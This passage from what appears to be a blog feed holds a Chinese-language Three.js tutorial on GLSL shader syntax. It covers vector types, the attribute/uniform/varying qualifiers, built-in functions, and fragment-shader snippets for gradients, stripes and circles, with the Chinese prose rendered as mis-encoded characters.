js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vec3 color1 = vec3(<span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">vec3 color2 = vec3(<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>);</span><br><span class="line">float mask1 = step(<span class="number">0.5</span>, fract(vUv.x * <span class="number">3.0</span>));</span><br><span class="line">float mask2 = step(<span class="number">0.5</span>, fract(vUv.y * <span class="number">3.0</span>));</span><br><span class="line">float mixer = abs(mask1 - mask2);</span><br><span class="line">vec3 color = mix(color1, color2, mixer);</span><br><span class="line">gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Shader GLSLè¯­æ³•</title>
      <link href="/2024/12/02/threejs-GLSL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2024/12/02/threejs-GLSL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<blockquote><p>ç€è‰²å™¨æ˜¯ä¸€ç§ä½¿ç”¨<em><code>GLSL</code></em>è¯­è¨€ç¼–å†™çš„è¿è¡Œåœ¨<em><code>GPU</code></em>ä¸Šçš„ç¨‹åºã€‚æ˜¯å±å¹•ä¸Šå‘ˆç°ç”»é¢å‰çš„æœ€åä¸€æ­¥ï¼Œç”¨å®ƒå¯ä»¥å®ç°å¯¹å…ˆå‰æ¸²æŸ“ç»“æœè¿›è¡Œä¿®æ”¹ï¼ˆå¦‚é¢œè‰²ã€ä½ç½®ï¼‰ï¼Œä»è€Œå®ç°é«˜çº§çš„æ¸²æŸ“æ•ˆæœã€‚åœ¨ <code>Three.js</code> ä¸­ï¼Œéœ€è¦ä½¿ç”¨ <code>GLSL</code> è¯­è¨€æ¥ç¼–å†™ç€è‰²å™¨ï¼Œå…¨ç§°æ˜¯ <code>OpenGL Shading Language</code>ï¼Œæ„ä¸º <code>OpenGL</code> ä¸­çš„ç€è‰²è¯­è¨€ã€‚</p></blockquote><h3 id="1-å˜é‡æ•°æ®ç±»å‹"><a href="#1-å˜é‡æ•°æ®ç±»å‹" class="headerlink" title="1. å˜é‡æ•°æ®ç±»å‹"></a>1. å˜é‡æ•°æ®ç±»å‹</h3><ul><li><code>float</code> æµ®ç‚¹æ•°</li><li><code>int</code> æ•´æ•°</li><li><code>bool</code> å¸ƒå°”å€¼</li><li><code>vec2</code> äºŒç»´å‘é‡</li><li><code>vec3</code> ä¸‰ç»´å‘é‡</li><li><code>vec4</code> å››ç»´å‘é‡</li><li><code>mat3</code></li><li><code>mat4</code></li><li><code>sampler2D</code></li><li><code>samplerCube</code></li></ul><p><em><code>vec</code></em>å‘é‡ç±»å‹ï¼Œå¯ä»¥åˆ†åˆ«çœ‹æˆç”± <code>(x,y)</code>ã€<code>(x,y,z)</code>æˆ–<code>(r,g,b)</code>ã€<code>(x,y,z,w)</code>æˆ–(<code>r,g,b,a)</code> ç­‰åˆ†é‡ç»„æˆï¼Œvec3 å¯ä»¥ç”± vec2+float åˆ›å»ºã€vec4 å¯ä»¥ç”± vec3+floatã€vec2+vec2 ç­‰ä¸åŒæ–¹å¼åˆ›å»ºï¼Œæ¯”è¾ƒçµæ´»ã€‚</p><p>GLSL é‡Œ rgb èŒƒå›´éƒ½æ˜¯ 0.0-1.0ï¼Œè€Œéä¸€èˆ¬çš„ 0-255ã€‚é»‘è‰²ä¸º<code>(0.0,0.0,0.0)</code>ã€ç™½è‰²ä¸º<code>(1.0,1.0,1.0)</code>ã€çº¢è‰²ä¸º<code>(1.0,0.0,0.0)</code>ã€‚<br>å¦‚æœè®¾ç½®çš„é¢œè‰²å€¼å°äº0.0ä¼šè¢«æˆªå–åˆ°0.0ï¼Œå¤§äº1.0ä¼šè¢«æˆªå–åˆ°1.0ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">float alpha = <span class="number">0.5</span>;</span><br><span class="line">int num = <span class="number">10</span>;</span><br><span class="line">bool flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">vec2 a = vec2(<span class="number">1.0</span>, <span class="number">0.0</span>);</span><br><span class="line"><span class="comment">// a.x=1.0 a.y=0.0</span></span><br><span class="line">a.x = <span class="number">2.0</span>;</span><br><span class="line">a.y = <span class="number">0.5</span>;</span><br><span class="line"></span><br><span class="line">vec2 a = vec2(<span class="number">1.0</span>);</span><br><span class="line"><span class="comment">// a.x=1.0 a.y=1.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‘é‡ä¹‹é—´æˆ–å‘é‡ä¸æµ®ç‚¹æ•°ä¹‹é—´çš„åŠ å‡ä¹˜é™¤å››åˆ™è¿ç®—æ˜¯åŸºäºæ¯ä¸ªåˆ†é‡å•ç‹¬è®¡ç®—</span></span><br><span class="line">vec2 a = vec2(<span class="number">1.0</span>) + vec2(<span class="number">0.1</span>, <span class="number">0.2</span>);</span><br><span class="line"><span class="comment">// a.x=1.1 a.y=1.2</span></span><br><span class="line">vec2 a = vec2(<span class="number">1.0</span>) * <span class="number">2.0</span>;</span><br><span class="line"><span class="comment">// a.x=2.0 a.y=2.0</span></span><br><span class="line"></span><br><span class="line">vec3 b = vec3(<span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">0.0</span>);</span><br><span class="line"><span class="comment">// b.x=1.0 b.y=2.0 b.z=0.0</span></span><br><span class="line"><span class="comment">// b.r=1.0 b.g=2.0 b.b=0.0</span></span><br><span class="line">b.z = <span class="number">3.0</span>;</span><br><span class="line"></span><br><span class="line">vec4 c = vec4(<span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>);</span><br><span class="line"><span class="comment">// c.x=c.y=c.z=c.w=1.0</span></span><br><span class="line"><span class="comment">// c.r=c.g=c.b=c.a=1.0</span></span><br><span class="line">c.r = <span class="number">0.9</span></span><br><span class="line">c.g = <span class="number">0.0</span>;</span><br><span class="line">c.b = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">vec3 d = vec3(vec2(<span class="number">0.5</span>), <span class="number">1.0</span>);</span><br><span class="line">vec4 e = vec4(vec3(<span class="number">1.0</span>), <span class="number">1.0</span>);</span><br><span class="line">vec4 e = vec4(vec2(<span class="number">0.3</span>), vec2(<span class="number">0.1</span>));</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-ä¿®é¥°ç¬¦"><a href="#2-ä¿®é¥°ç¬¦" class="headerlink" title="2. ä¿®é¥°ç¬¦"></a>2. ä¿®é¥°ç¬¦</h3><p>GLSLçº¦å®šä¿—æˆåœ°å°† <code>attribute</code>å˜é‡ç”¨<code>a</code>å¼€å¤´å¦‚<code>aRadom</code>ï¼Œ<code>uniform</code>çš„ç”¨<code>u</code>å¼€å¤´å¦‚<code>uTime</code>ï¼Œ<code>varying</code>çš„ç”¨<code>v</code>å¼€å¤´å¦‚<code>vUv</code>.</p><h4 id="2-1-attribute-é¡¶ç‚¹ç›¸å…³å€¼"><a href="#2-1-attribute-é¡¶ç‚¹ç›¸å…³å€¼" class="headerlink" title="2.1 attribute é¡¶ç‚¹ç›¸å…³å€¼"></a>2.1 attribute é¡¶ç‚¹ç›¸å…³å€¼</h4><p><code>attributes</code> ä¿®é¥°ç¬¦è¡¨æ˜è¿™ä¸ªæ•°æ®åœ¨æ¯ä¸ªé¡¶ç‚¹ä¸Šéƒ½ä¸åŒã€‚å†…ç½®çš„attributeæœ‰</p><ul><li><code>attribute vec3 position</code> é¡¶ç‚¹åæ ‡</li><li><code>attribute vec3 normal</code> æ³•çº¿å‘é‡</li><li><code>attribute vec2 uv</code>  çº¹ç†åæ ‡</li><li><code>attribute float aRandom</code> æ¯ä¸ªé¡¶ç‚¹ä¸åŒçš„éšæœºå€¼</li></ul><h4 id="2-2-uniform-ç»Ÿä¸€å€¼"><a href="#2-2-uniform-ç»Ÿä¸€å€¼" class="headerlink" title="2.2 uniform ç»Ÿä¸€å€¼"></a>2.2 uniform ç»Ÿä¸€å€¼</h4><p><code>uniform</code>ä¿®é¥°ç¬¦ï¼Œè¡¨ç¤ºæ‰€æœ‰çº¿ç¨‹éƒ½ä¼ å…¥çš„ã€ç»Ÿä¸€çš„å€¼ã€‚å†…ç½®çš„uniforms</p><ul><li><code>uniform mat4 modelMatrix</code></li><li><code>uniform mat4 modelViewMatrix</code></li><li><code>uniform mat4 projectionMatrix</code></li><li><code>uniform mat4 viewMatrix</code></li><li><code>uniform mat3 normalMatrix</code></li><li><code>uniform vec3 cameraPosition</code></li></ul><h4 id="2-3-varying-ä¼ é€’å€¼"><a href="#2-3-varying-ä¼ é€’å€¼" class="headerlink" title="2.3 varying ä¼ é€’å€¼"></a>2.3 varying ä¼ é€’å€¼</h4><p>å¦‚æœé¡¶ç‚¹ç€è‰²å™¨çš„å˜é‡æƒ³åœ¨ç‰‡å…ƒç€è‰²å™¨é‡Œä½¿ç”¨ï¼Œå°±éœ€è¦å€ŸåŠ©<code>varying</code>æ¥ä¼ é€’ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Vertex shader</span></span><br><span class="line">attribute vec2 uv;</span><br><span class="line">varing vec2 vUv;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  vUv = uv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fragment Shader</span></span><br><span class="line">varying vec2 vUV;</span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  gl_FragColor = vec4(vUv, <span class="number">1.0</span>, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-å†…ç½®å‡½æ•°"><a href="#3-å†…ç½®å‡½æ•°" class="headerlink" title="3. å†…ç½®å‡½æ•°"></a>3. å†…ç½®å‡½æ•°</h3><h4 id="3-1-è¿ç®—å‡½æ•°"><a href="#3-1-è¿ç®—å‡½æ•°" class="headerlink" title="3.1 è¿ç®—å‡½æ•°"></a>3.1 è¿ç®—å‡½æ•°</h4><ul><li><em><code>abs(x)</code></em>ï¼šå– x çš„ç»å¯¹å€¼</li><li><em><code>radians(x)</code></em>ï¼šè§’åº¦è½¬å¼§åº¦ï¼ˆå¼§åº¦æ˜¯åœ†çš„åŠå¾„å’Œåœ†å¿ƒè§’æ‰€å¯¹åº”çš„å¼§é•¿ä¹‹æ¯”ï¼‰</li><li><em><code>degrees(x)</code></em>ï¼šå¼§åº¦è½¬è§’åº¦</li><li><em><code>sin(x)</code></em>ï¼šæ­£å¼¦å‡½æ•°ï¼Œä¼ å…¥å€¼ä¸ºå¼§åº¦ã€‚è¿˜æœ‰ cos ä½™å¼¦å‡½æ•°ã€tan æ­£åˆ‡å‡½æ•°ã€asin åæ­£å¼¦ã€acosåä½™å¼¦ã€atan åæ­£åˆ‡ç­‰</li><li><em><code>pow(x,y)</code></em>ï¼šx^y</li><li><em><code>exp(x)</code></em>ï¼še^x</li><li><em><code>exp2(x)</code></em>ï¼š2^x</li><li><em><code>log(x)</code></em>ï¼šlogex</li><li><em><code>log2(x)</code></em>ï¼šlog2x</li><li><em><code>sqrt(x)</code></em>ï¼šxâˆšï¼Œæ ¹å·x</li><li><em><code>inversesqr(x)</code></em>ï¼š1 / xâˆš , æ ¹å·xçš„å€’æ•°</li><li><em><code>sign(x)</code></em>ï¼šx&gt;0 è¿”å› 1.0ï¼Œx&lt;0 è¿”å› -1.0ï¼Œå¦åˆ™è¿”å› 0.0</li><li><em><code>ceil(x)</code></em>ï¼šè¿”å›å¤§äºæˆ–è€…ç­‰äº x çš„æ•´æ•°</li><li><em><code>floor(x)</code></em>ï¼šè¿”å›å°äºæˆ–è€…ç­‰äº x çš„æ•´æ•°</li><li><em><code>fract(x)</code></em>ï¼šè¿”å› x-floor(x) çš„å€¼</li><li><em><code>mod(x,y)</code></em>ï¼šå–xé™¤ä»¥yçš„ä½™æ•°</li><li><em><code>min(x,y)</code></em>ï¼šè·å– xã€y ä¸­å°çš„é‚£ä¸ª</li><li><em><code>max(x,y)</code></em>ï¼šè·å– xã€y ä¸­å¤§çš„é‚£ä¸ª</li><li><em><code>dFdx(p)</code></em>ï¼šp åœ¨ x æ–¹å‘ä¸Šçš„åå¯¼æ•°</li><li><em><code>dFdy(p)</code></em>ï¼šp åœ¨ y æ–¹å‘ä¸Šçš„åå¯¼æ•°</li><li><em><code>fwidth(p)</code></em>ï¼šp åœ¨ x å’Œ y æ–¹å‘ä¸Šçš„åå¯¼æ•°çš„ç»å¯¹å€¼ä¹‹å’Œ</li><li><em><code>step(x, a)</code></em>ï¼šx &lt; aè¿”å› 0.0ï¼Œå¦åˆ™è¿”å› 1.0ã€‚å¸¸ç”¨äºç”Ÿæˆé˜¶æ¢¯æ•ˆæœ</li><li><em><code>smoothstep(t1, t2, x)</code></em>: åœ¨t1åˆ°t2ä¹‹é—´å¹³æ»‘è¿‡åº¦ï¼Œå°äºt1æ—¶è¿”å›0ï¼Œå¤§äºt2æ—¶è¿”å›1ã€‚å¸¸ç”¨äºå®ç°é¢œè‰²æ¸å˜ã€ç‰©ä½“å¹³æ»‘ç§»åŠ¨</li><li><em><code>mix(colorA, colorB, a)</code></em>ï¼šè¿”å›<code>colorA * (1âˆ’a) + colorB * a</code>ã€‚ é¢œè‰²å‡½æ•°ï¼Œå¸¸ç”¨äºæ··åˆcolorAå’ŒcolorB, aæ˜¯æ··åˆç³»æ•°ï¼ŒèŒƒå›´ä¸º0åˆ°1ã€‚å½“aä¸º0æ—¶ï¼Œæ··åˆåçš„å€¼ç­‰äºxï¼›å½“aä¸º1æ—¶ï¼Œæ··åˆåçš„å€¼ç­‰äºyï¼›å½“aåœ¨0åˆ°1ä¹‹é—´æ—¶ï¼Œæ··åˆåçš„å€¼æ˜¯xå’Œyçš„çº¿æ€§æ’å€¼ã€‚å®ç°é¢œè‰²æ¸å˜ã€é€æ˜åº¦æ··åˆ<br><br></li></ul><h4 id="3-2-å‡ ä½•å‡½æ•°"><a href="#3-2-å‡ ä½•å‡½æ•°" class="headerlink" title="3.2 å‡ ä½•å‡½æ•°"></a>3.2 å‡ ä½•å‡½æ•°</h4><ul><li><em><code>length(vec2 p)</code></em>: è®¡ç®—å‘é‡çš„é•¿åº¦</li><li><em><code>distance(vec2 p0, vec2 p1)</code></em>: è®¡ç®—ä¸¤å‘é‡ä¹‹é—´çš„è·ç¦»</li><li><em><code>dot(vec2 x, vec2 y)</code></em>: è®¡ç®—ä¸¤ä¸ªå‘é‡çš„ç‚¹ç§¯</li><li><em><code>cross(x,y)</code></em>ï¼šè¿”å›å‘é‡ xy çš„å·®ç§¯</li><li><em><code>normalize(x)</code></em>ï¼šè¿”å›ä¸ x å‘é‡æ–¹å‘ç›¸åŒï¼Œé•¿åº¦ä¸º 1 çš„å‘é‡</li></ul><p><br></p><h4 id="3-3-noiseå™ªå£°"><a href="#3-3-noiseå™ªå£°" class="headerlink" title="3.3 noiseå™ªå£°"></a>3.3 noiseå™ªå£°</h4><p>noise å‡½æ•°èƒ½ä½¿ç›¸é‚»çš„ç‚¹ï¼ˆä¸€ç»´ã€äºŒç»´ã€ä¸‰ç»´çš„ç‚¹éƒ½è¡Œï¼‰äº§ç”Ÿç›¸è¿‘çš„æ•°å€¼ï¼Œè€Œä¸æ˜¯ random éšæœºå‡½æ•°é‚£ç§æ¯ä¸ªä½ç½®çš„æ•°å€¼éƒ½å’Œé™„è¿‘æ— å…³çš„æ•ˆæœã€‚</p><h3 id="4-ç‰‡å…ƒç€è‰²å™¨"><a href="#4-ç‰‡å…ƒç€è‰²å™¨" class="headerlink" title="4. ç‰‡å…ƒç€è‰²å™¨"></a>4. ç‰‡å…ƒç€è‰²å™¨</h3><p><code>uv</code>æ˜¯æ¯ä¸ªç‰‡å…ƒçš„æ•°å€¼ï¼Œå·¦ä¸‹è§’ vUv ä¸º (0.0, 0.0) æ‰€ä»¥å¯¹åº”çš„ vUv.x=vUv.y=0.0ã€‚åŒç†å·¦ä¸Šè§’å°±æ˜¯ (0.0, 1.0)ã€å³ä¸‹è§’ (1.0, 0.0)ã€å³ä¸Šè§’ (1.0, 1.0)ã€æœ€ä¸­é—´ (0.5, 0.5)ã€‚*</p><h4 id="4-1-é¢œè‰²æ•ˆæœ"><a href="#4-1-é¢œè‰²æ•ˆæœ" class="headerlink" title="4.1 é¢œè‰²æ•ˆæœ"></a>4.1 é¢œè‰²æ•ˆæœ</h4><h5 id="4-1-1-é¢œè‰²æ¸å˜"><a href="#4-1-1-é¢œè‰²æ¸å˜" class="headerlink" title="4.1.1 é¢œè‰²æ¸å˜"></a>4.1.1 é¢œè‰²æ¸å˜</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">varying vec2 vUv;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  gl_FragColor = vec4(vUv.x, <span class="number">0.0</span>, <span class="number">0.0</span>, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-1-2-é¢œè‰²çªå˜"><a href="#4-1-2-é¢œè‰²çªå˜" class="headerlink" title="4.1.2 é¢œè‰²çªå˜"></a>4.1.2 é¢œè‰²çªå˜</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">float color = step(<span class="number">0.5</span>, vUv.x); <span class="comment">// æ”¹æˆ0.3, çªå˜çš„ä½ç½®ä¹Ÿä¼šéšä¹‹æ”¹å˜</span></span><br><span class="line">gl_FragColor = vec4(vec3(color), <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h5 id="4-1-3-ç†Ÿæ‚‰çš„é’çº¢ã€è“ç²‰æ•ˆæœ"><a href="#4-1-3-ç†Ÿæ‚‰çš„é’çº¢ã€è“ç²‰æ•ˆæœ" class="headerlink" title="4.1.3 ç†Ÿæ‚‰çš„é’çº¢ã€è“ç²‰æ•ˆæœ"></a>4.1.3 ç†Ÿæ‚‰çš„é’çº¢ã€è“ç²‰æ•ˆæœ</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gl_FragColor = vec4(vUv, <span class="number">0.0</span>, <span class="number">1.0</span>); <span class="comment">// é’çº¢</span></span><br><span class="line">gl_FragColor = vec4(vUv, <span class="number">1.0</span>, <span class="number">1.0</span>); <span class="comment">// è“ç²‰</span></span><br></pre></td></tr></table></figure><h5 id="4-1-4-æ¡çº¹æ•ˆæœ"><a href="#4-1-4-æ¡çº¹æ•ˆæœ" class="headerlink" title="4.1.4 æ¡çº¹æ•ˆæœ"></a>4.1.4 æ¡çº¹æ•ˆæœ</h5><p>é‡å¤æ¡çº¹æ•ˆæœè¦ç”¨<code>fract</code>ï¼Œè¿”å›x.floor() - xçš„å€¼ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å–vUv.x * 3.0å°æ•°ï¼Œ&lt; 0.5è¿”å›0ï¼Œ&gt;0.5è¿”å›1</span></span><br><span class="line">float color = step(<span class="number">0.5</span>, fract(vUv.x * <span class="number">3.0</span>))</span><br><span class="line">gl_FragColor = vec4(vec3(color), <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure></p><h5 id="4-1-5-æŒ‡å®šé¢œè‰²æ¸å˜ã€çªå˜ã€é‡å¤æ¸å˜ã€æ¡çº¹æ•ˆæœ"><a href="#4-1-5-æŒ‡å®šé¢œè‰²æ¸å˜ã€çªå˜ã€é‡å¤æ¸å˜ã€æ¡çº¹æ•ˆæœ" class="headerlink" title="4.1.5 æŒ‡å®šé¢œè‰²æ¸å˜ã€çªå˜ã€é‡å¤æ¸å˜ã€æ¡çº¹æ•ˆæœ"></a>4.1.5 æŒ‡å®šé¢œè‰²æ¸å˜ã€çªå˜ã€é‡å¤æ¸å˜ã€æ¡çº¹æ•ˆæœ</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vec3 color1 = vec3(<span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>); <span class="comment">// é»„è‰²</span></span><br><span class="line">vec3 color2 = vec3(<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>); <span class="comment">// é’è‰²</span></span><br><span class="line">float mixer = vUv.x; <span class="comment">// æ¸å˜</span></span><br><span class="line"><span class="comment">// float mixer = step(0.5, vUv.x); // çªå˜</span></span><br><span class="line"><span class="comment">// float mixer = fract(vUv.x * 3.0); // é‡å¤æ¸å˜</span></span><br><span class="line"><span class="comment">// float mixer = step(0.5, fract(vUv.x * 3.0)); // æ¡çº¹</span></span><br><span class="line">vec3 color = mix(color1, color2, mixer);</span><br><span class="line">gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><p><br></p><h4 id="4-2-ç»˜åˆ¶å›¾å½¢"><a href="#4-2-ç»˜åˆ¶å›¾å½¢" class="headerlink" title="4.2. ç»˜åˆ¶å›¾å½¢"></a>4.2. ç»˜åˆ¶å›¾å½¢</h4><h5 id="4-2-1-åœ†å½¢"><a href="#4-2-1-åœ†å½¢" class="headerlink" title="4.2.1 åœ†å½¢"></a>4.2.1 åœ†å½¢</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">float dist = length(vUv - vec2(<span class="number">0.5</span>)); <span class="comment">// å°†æ•´ä½“åæ ‡ç§»åˆ°æ­£ä¸­å¿ƒ</span></span><br><span class="line">float radius = <span class="number">0.5</span>;</span><br><span class="line">float color = step(radius, dist);</span><br><span class="line">gl_FragColor = vec4(vec3(color), <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h5 id="4-2-2-åŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†"><a href="#4-2-2-åŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†" class="headerlink" title="4.2.2 åŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†"></a>4.2.2 åŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">varying vec2 vUv;</span><br><span class="line">uniform float uTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  float dist = length(vUv - vec2(<span class="number">0.5</span>)); <span class="comment">// å°†æ•´ä½“åæ ‡ç§»åˆ°æ­£ä¸­å¿ƒ</span></span><br><span class="line">  float radius = <span class="number">0.5</span> * (sin(uTime) * <span class="number">0.5</span> + <span class="number">0.5</span>);</span><br><span class="line">  vec3 color = vec3(step(radius, dist));</span><br><span class="line">  gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-2-3-ä¸€ç»„å¤šä¸ªï¼ŒåŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†"><a href="#4-2-3-ä¸€ç»„å¤šä¸ªï¼ŒåŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†" class="headerlink" title="4.2.3 ä¸€ç»„å¤šä¸ªï¼ŒåŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†"></a>4.2.3 ä¸€ç»„å¤šä¸ªï¼ŒåŠå¾„åŠ¨æ€å˜åŒ–çš„åœ†</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">varying vec2 vUv;</span><br><span class="line">uniform float uTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  <span class="comment">// å…ˆé‡å¤ uvï¼Œå†å±…ä¸­ï¼Œå†ç»˜åˆ¶åœ†å½¢</span></span><br><span class="line">  float dist = length(fract(vUv * <span class="number">5.0</span>) - vec2(<span class="number">0.5</span>));</span><br><span class="line">  <span class="comment">// åŠå¾„å¤§å°éšæ—¶é—´å‘¨æœŸå˜åŒ–</span></span><br><span class="line">  float radius = <span class="number">0.5</span> * (sin(uTime + vUv.x + vUv.y) * <span class="number">0.5</span> + <span class="number">0.5</span>);</span><br><span class="line">  vec3 color = vec3(step(radius, dist));</span><br><span class="line">  gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-2-4-å¾„å‘æ¡çº¹-åŠ¨ç”»"><a href="#4-2-4-å¾„å‘æ¡çº¹-åŠ¨ç”»" class="headerlink" title="4.2.4 å¾„å‘æ¡çº¹(åŠ¨ç”»)"></a>4.2.4 å¾„å‘æ¡çº¹(åŠ¨ç”»)</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">varying vec2 vUv;</span><br><span class="line">uniform float uTime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main() &#123;</span><br><span class="line">  <span class="comment">// å…ˆå±…ä¸­ï¼Œåé‡å¤ï¼Œå†ç»˜åˆ¶åœ†å½¢</span></span><br><span class="line">  float dist = fract(length(vUv - vec2(<span class="number">0.5</span>)) * <span class="number">5.0</span>);</span><br><span class="line">  <span class="comment">// åŠ¨ç”»æ•ˆæœ</span></span><br><span class="line">  <span class="comment">// float dist = fract((length(vUv - vec2(0.5)) /0.707 - uTime * 0.5) * 5.0);</span></span><br><span class="line">  float radius = <span class="number">0.5</span>;</span><br><span class="line">  vec3 color = vec3(step(radius, dist));</span><br><span class="line">  gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-2-5-æŒ‡å®šé¢œè‰²çš„åœ†å½¢"><a href="#4-2-5-æŒ‡å®šé¢œè‰²çš„åœ†å½¢" class="headerlink" title="4.2.5 æŒ‡å®šé¢œè‰²çš„åœ†å½¢"></a>4.2.5 æŒ‡å®šé¢œè‰²çš„åœ†å½¢</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vec3 color1 = vec3(<span class="number">1.0</span>, <span class="number">1.0</span>, <span class="number">0.0</span>);</span><br><span class="line">vec3 color2 = vec3(<span class="number">0.0</span>, <span class="number">1.0</span>, <span class="number">1.0</span>); </span><br><span class="line">float mixer = length(vUv - vec2(<span class="number">0.5</span>)); <span class="comment">// åœ†å½¢æ¸å˜</span></span><br><span class="line"><span class="comment">// mixer = step(0.25, mixer); // åœ†å½¢</span></span><br><span class="line">vec3 color = mix(color1, color2, mixer);</span><br><span class="line">gl_FragColor = vec4(color, <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><h5 id="4-2-6-å¯¹è§’çº¿æ¸å˜"><a href="#4-2-6-å¯¹è§’çº¿æ¸å˜" class="headerlink" title="4.2.6 å¯¹è§’çº¿æ¸å˜"></a>4.2.6 å¯¹è§’çº¿æ¸å˜</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 